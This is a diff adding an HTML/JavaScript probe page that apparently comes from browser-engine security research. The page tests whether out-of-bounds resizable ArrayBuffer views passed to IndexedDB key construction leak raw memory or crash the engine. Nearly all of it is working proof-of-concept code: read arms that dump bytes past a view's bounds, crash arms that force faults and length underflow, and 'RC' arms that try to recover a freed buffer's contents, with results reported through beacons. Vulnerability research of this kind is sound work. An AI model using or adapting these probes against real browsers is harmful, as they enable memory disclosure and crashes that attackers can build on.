@@ -1,0 +1,225 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>caps15 — OOB resizable view reaches ArrayBufferView::byteLength() via IDB keys</title></head>
+<body>
+<script>
+/*
+  docs/96 probe.
+
+  Claim under test: `ArrayBufferView::byteLength()`/`byteOffset()` test the bounds INVERTED relative to upstream
+  (docs/95 §6), and although the IDL BufferSource converter refuses every resizable view (`toWrapped`), the
+  IndexedDB key builder takes a *raw* JSArrayBufferView and calls `JSArrayBufferView::possiblySharedImpl()`
+  -> `wrappedAs()` (which deliberately skips the sub-range check for resizable buffers) -> then
+  `ThreadSafeDataBuffer::copyData(view->data(), view->byteLength())`. So an out-of-bounds resizable view
+  should make an IDB binary key whose length is the view's *raw* length while `view.byteLength` is 0, and the
+  bytes handed back to JS through `IDBKeyRange.only(v).lower` should be a copy of that raw range.
+
+  Arms (one per beacon group):
+    N1  non-resizable 8192 buffer, 8192 view                     -> the ordinary reference
+    N2  non-resizable 8192 buffer, 4096 view at offset 4096       -> ordinary sub-range
+    R0  resizable 8192, in-bounds view                            -> inverted test predicts key length 0
+    R1  resizable 8192, view 0..8192, ab.resize(4112)             -> OOB; predicts key length 8192
+    D1  the same through an explicit-length DataView
+    S1  structuredClone() of the same OOB view                    -> control: refuses (isOutOfBounds gate)
+    B1  new Blob([oobView]).size                                  -> control: IDL gate
+  Crash arms (separate load):
+    C1  ab.resize(4096) then only(v): the second page is mprotect(PROT_NONE), the raw 8192-byte copy must fault
+    C2  auto-length view at offset 4096, ab.resize(16): byteLength() underflows to ~2^64
+*/
+(function () {
+  'use strict';
+  var Q = new URLSearchParams(location.search);
+  var ARM = Q.get('arm') || 'read';
+  var ONLY = (Q.get('only') || '').split(',').filter(Boolean);
+  function on(name) { return !ONLY.length || ONLY.indexOf(name) >= 0; }
+  function B(m) { (new Image()).src = '/ev?m=' + encodeURIComponent(m); }
+  function arm(name, fn) {
+    try { fn(); } catch (e) {
+      B(name + ' THREW=' + e.name + ':' + String(e.message).replace(/[^\x20-\x7e]/g, '?').slice(0, 70));
+    }
+  }
+  function hex(u8, off, n) {
+    var s = '';
+    for (var i = off; i < off + n && i < u8.length; i++) s += ('0' + u8[i].toString(16)).slice(-2);
+    return s;
+  }
+  function keyOf(v, tag) {
+    try {
+      var r = IDBKeyRange.only(v);
+      var k = r.lower;
+      var t = (k === null) ? 'null' : (k && k.constructor ? k.constructor.name : typeof k);
+      var bl = (k && typeof k.byteLength === 'number') ? k.byteLength : -1;
+      B(tag + ' ok type=' + t + ' bl=' + bl);
+      if (bl > 0) {
+        var u = new Uint8Array(k);
+        B(tag + ' head=' + hex(u, 0, 8) + ' at4128=' + hex(u, 4128, 8) + ' tail=' + hex(u, u.length - 8, 8));
+      }
+    } catch (e) {
+      B(tag + ' err=' + e.name + ':' + String(e.message).replace(/[^\x20-\x7e]/g, '?').slice(0, 70));
+    }
+  }
+  function pat(ab, seed) {
+    var u = new Uint8Array(ab);
+    for (var i = 0; i < u.length; i++) u[i] = (i ^ seed) & 0xff;
+    return u;
+  }
+
+  B('caps15 arm=' + ARM + ' only=' + (ONLY.join(',') || '-')
+    + ' resize=' + (typeof ArrayBuffer.prototype.resize)
+    + ' idbkr=' + (typeof IDBKeyRange)
+    + ' onlyfn=' + (typeof (window.IDBKeyRange && IDBKeyRange.only))
+    + ' sc=' + (typeof structuredClone)
+    + ' idb=' + (typeof indexedDB));
+
+  if (ARM === 'read') {
+    if (on('N1')) arm('N1', function () {
+      var ab = new ArrayBuffer(8192);
+      pat(ab, 0x5a);
+      var v = new Uint8Array(ab, 0, 8192);
+      B('N1 jsBL=' + v.byteLength + ' jsLen=' + v.length + ' off=' + v.byteOffset + ' bufBL=' + ab.byteLength);
+      keyOf(v, 'N1');
+    });
+
+    if (on('N2')) arm('N2', function () {
+      var ab = new ArrayBuffer(8192);
+      pat(ab, 0x30);
+      var v = new Uint8Array(ab, 4096, 4096);
+      B('N2 jsBL=' + v.byteLength + ' jsLen=' + v.length + ' off=' + v.byteOffset + ' bufBL=' + ab.byteLength);
+      keyOf(v, 'N2');
+    });
+
+    if (on('R0')) arm('R0', function () {
+      var ab = new ArrayBuffer(8192, { maxByteLength: 8192 });
+      pat(ab, 0x5a);
+      var v = new Uint8Array(ab, 0, 8192);
+      B('R0 jsBL=' + v.byteLength + ' jsLen=' + v.length + ' off=' + v.byteOffset + ' bufBL=' + ab.byteLength);
+      keyOf(v, 'R0');
+    });
+
+    if (on('R1')) arm('R1', function () {
+      var ab = new ArrayBuffer(8192, { maxByteLength: 8192 });
+      pat(ab, 0x5a);
+      var v = new Uint8Array(ab, 0, 8192);
+      ab.resize(4112);
+      B('R1 jsBL=' + v.byteLength + ' jsLen=' + v.length + ' off=' + v.byteOffset + ' bufBL=' + ab.byteLength);
+      keyOf(v, 'R1');
+    });
+
+    if (on('D1')) arm('D1', function () {
+      var ab = new ArrayBuffer(8192, { maxByteLength: 8192 });
+      pat(ab, 0x11);
+      var v;
+      try { v = new DataView(ab, 0, 8192); B('D1 ctor=ok'); }
+      catch (e) { B('D1 ctor=' + e.name + ':' + String(e.message).replace(/[^\x20-\x7e]/g, '?').slice(0, 50)); return; }
+      ab.resize(4112);
+      try { B('D1 jsBL=' + v.byteLength + ' off=' + v.byteOffset); }
+      catch (e) { B('D1 getter=' + e.name + ':' + String(e.message).replace(/[^\x20-\x7e]/g, '?').slice(0, 50)); }
+      keyOf(v, 'D1');
+    });
+
+    if (on('S1')) arm('S1', function () {
+      var ab = new ArrayBuffer(8192, { maxByteLength: 8192 });
+      pat(ab, 0x5a);
+      var v = new Uint8Array(ab, 0, 8192);
+      ab.resize(4112);
+      B('S1 pre jsBL=' + v.byteLength + ' bufBL=' + ab.byteLength);
+      try { var c = structuredClone(v); B('S1 ok bl=' + c.byteLength + ' len=' + c.length); }
+      catch (e) { B('S1 err=' + e.name + ':' + String(e.message).replace(/[^\x20-\x7e]/g, '?').slice(0, 50)); }
+      try { var b = new Blob([v]); B('B1 ok size=' + b.size); }
+      catch (e) { B('B1 err=' + e.name + ':' + String(e.message).replace(/[^\x20-\x7e]/g, '?').slice(0, 50)); }
+    });
+  }
+
+  if (ARM === 'c1') arm('C1', function () {
+    var ab = new ArrayBuffer(8192, { maxByteLength: 8192 });
+    pat(ab, 0x5a);
+    var v = new Uint8Array(ab, 0, 8192);
+    ab.resize(4096);
+    B('C1 pre jsBL=' + v.byteLength + ' jsLen=' + v.length + ' off=' + v.byteOffset + ' bufBL=' + ab.byteLength);
+    var r = IDBKeyRange.only(v);
+    B('C1 post bl=' + r.lower.byteLength);
+  });
+
+  if (ARM === 'c3') arm('C3', function () {
+    // PageCount::pageSize is 64 KiB, so only a shrink that crosses a 64 KiB boundary mprotects anything.
+    var ab = new ArrayBuffer(131072, { maxByteLength: 131072 });
+    pat(ab, 0x5a);
+    var v = new Uint8Array(ab, 0, 131072);
+    ab.resize(4096);
+    B('C3 pre jsBL=' + v.byteLength + ' jsLen=' + v.length + ' off=' + v.byteOffset + ' bufBL=' + ab.byteLength);
+    var r = IDBKeyRange.only(v);
+    B('C3 post bl=' + r.lower.byteLength);
+  });
+
+  if (ARM === 'rc') arm('RC', function () {
+    // Does the 64 KiB growable-bounds-checking reservation hand back a *freed* ArrayBuffer's bytes?
+    var A = new ArrayBuffer(65536, { maxByteLength: 65536 });
+    var u = new Uint8Array(A);
+    for (var i = 0; i < 65536; i++) u[i] = 0xA5;
+    B('RC wrote=65536 a5');
+    A = null; u = null;
+    var junk = [];
+    for (var j = 0; j < 200000; j++) junk.push({ a: j, b: 'x' + j });
+    junk = null;
+    var keep = [];
+    for (var k = 0; k < 16; k++) keep.push(new ArrayBuffer(65536, { maxByteLength: 65536 }));
+    var nzBufs = 0, a5 = 0, firstnz = -1, firsta5 = -1, fails = 0;
+    for (var m = 0; m < keep.length; m++) {
+      var buf = keep[m];
+      var v = new Uint8Array(buf, 0, 65536);
+      buf.resize(16);
+      var ku;
+      try { ku = new Uint8Array(IDBKeyRange.only(v).lower); } catch (e) { fails++; continue; }
+      var nzHere = 0;
+      for (var p = 0; p < ku.length; p++) {
+        if (ku[p] !== 0) {
+          nzHere++;
+          if (firstnz < 0) firstnz = p;
+          if (ku[p] === 0xA5) { a5++; if (firsta5 < 0) firsta5 = p; }
+        }
+      }
+      if (nzHere) nzBufs++;
+    }
+    B('RC bufs=' + keep.length + ' nzBufs=' + nzBufs + ' a5=' + a5 + ' firstnz=' + firstnz + ' firsta5=' + firsta5 + ' fails=' + fails);
+  });
+
+  if (ARM === 'rc2') arm('RC2', function () {
+    // Decisive disclosure test: a 16-byte resizable buffer commits its whole 64 KiB reservation, and a
+    // 65536-byte view over it is OOB from birth (no resize needed). Does a *freed* 64 KiB buffer's pattern
+    // come back? A WeakRef witnesses that the previous buffer was collected.
+    var A = new ArrayBuffer(65536, { maxByteLength: 65536 });
+    var u = new Uint8Array(A);
+    for (var i = 0; i < 65536; i++) u[i] = 0xA5;
+    var wr = new WeakRef(A);
+    A = null; u = null;
+    var junk = [];
+    for (var j = 0; j < 400000; j++) junk.push({ a: j });
+    junk = null;
+    var collected = (wr.deref() === undefined);
+    B('RC2 collected=' + collected);
+    var B2 = new ArrayBuffer(16, { maxByteLength: 65536 });
+    var v = new Uint8Array(B2, 0, 65536);
+    var ku;
+    try { ku = new Uint8Array(IDBKeyRange.only(v).lower); }
+    catch (e) { B('RC2 err=' + e.name + ':' + String(e.message).replace(/[^\x20-\x7e]/g, '?').slice(0, 50)); return; }
+    var nz = 0, a5 = 0, firsta5 = -1, firstnz = -1;
+    for (var p = 0; p < ku.length; p++) {
+      if (ku[p] !== 0) { nz++; if (firstnz < 0) firstnz = p; if (ku[p] === 0xA5) { a5++; if (firsta5 < 0) firsta5 = p; } }
+    }
+    B('RC2 bl=' + ku.length + ' nz=' + nz + ' a5=' + a5 + ' firstnz=' + firstnz + ' firsta5=' + firsta5);
+  });
+
+  if (ARM === 'c2') arm('C2', function () {
+    var ab = new ArrayBuffer(8256, { maxByteLength: 8256 });
+    pat(ab, 0x77);
+    var v = new Uint8Array(ab, 4096);
+    var rawLen = v.length;
+    ab.resize(16);
+    B('C2 pre jsBL=' + v.byteLength + ' jsLen=' + v.length + ' rawLen=' + rawLen + ' off=' + v.byteOffset + ' bufBL=' + ab.byteLength);
+    var r = IDBKeyRange.only(v);
+    B('C2 post bl=' + r.lower.byteLength);
+  });
+
+  B('done arm=' + ARM);
+})();
+</script>
+</body></html>
